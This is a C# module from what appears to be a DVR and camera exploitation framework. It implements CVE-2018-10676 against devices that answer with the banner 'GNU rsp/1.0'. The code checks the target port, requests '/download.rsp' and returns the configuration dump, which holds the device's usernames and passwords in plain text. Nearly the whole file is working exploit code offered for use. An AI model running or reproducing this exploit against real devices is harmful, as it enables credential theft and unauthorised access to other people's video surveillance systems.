using System;
using System.Text;
using System.Text.RegularExpressions;
using ExploitMaker;
using ExploitMaker.Exceptions;
using ExploitMaker.Helpers;
using ExploitMaker.Modules;

namespace Exploits
{
    public class CVE_2018_10676 : Module
    {
        public override string Description => "Gets DVR Credentials in many vendors that responds using the banner 'Server: GNU rsp/1.0'. This exploit tries to download the configuration file that contains the credentials in plain text.";

        public override string CommonName => "CVE-2018-10676";

        public override ExploitResult Run(Camera cam)
        {
            const int dataLength = 66000; //This is an aproximate size

            //Check opened port
            if (!ConnectionHelper.IsOpenPort(cam.Host, int.Parse(cam.Port)))
                throw new ExploituUreachableTargetException(cam, CommonName);

            //We are going to try download the file
            using (var result = ConnectionHelper.DownloadHttpFile(cam.Host, cam.Port, cam.UrlHttp + "/download.rsp", dataLength))
            {
                //If we get null, the server is not alive
                if (result == null)
                    throw new ExploituUreachableTargetException(cam, CommonName);

                //If we get a response, the server is vulnerable
                var bytes = BinaryHelper.ReadBytes(result);
                var str = CleanString(Encoding.UTF8.GetString(bytes));
                                
                return str.Contains("</html>")
                    ? new ExploitResult(false, string.Format(Phrases.Test_NotVulnerable, cam.Address, CommonName), "")
                    : new ExploitResult(true, string.Format(Phrases.Test_Success, cam.Address, CommonName,  "- Please to get the username and password check the output memory dump" ), 
                                              str, 
                                              "", "");
            }
        }

        private string CleanString(string content)
        {
            var ascciPrinteable = new StringBuilder();
            foreach (var c in content)
            {
                if (c >= 32 && c <= 126)
                    ascciPrinteable.Insert(ascciPrinteable.Length, c);
                else if (c == 0)
                {
                    ascciPrinteable.Insert(ascciPrinteable.Length, " ");
                }
            }
            return  Regex.Replace(ascciPrinteable.ToString(), @"\s+", " ").ToLower();
        }
    }
}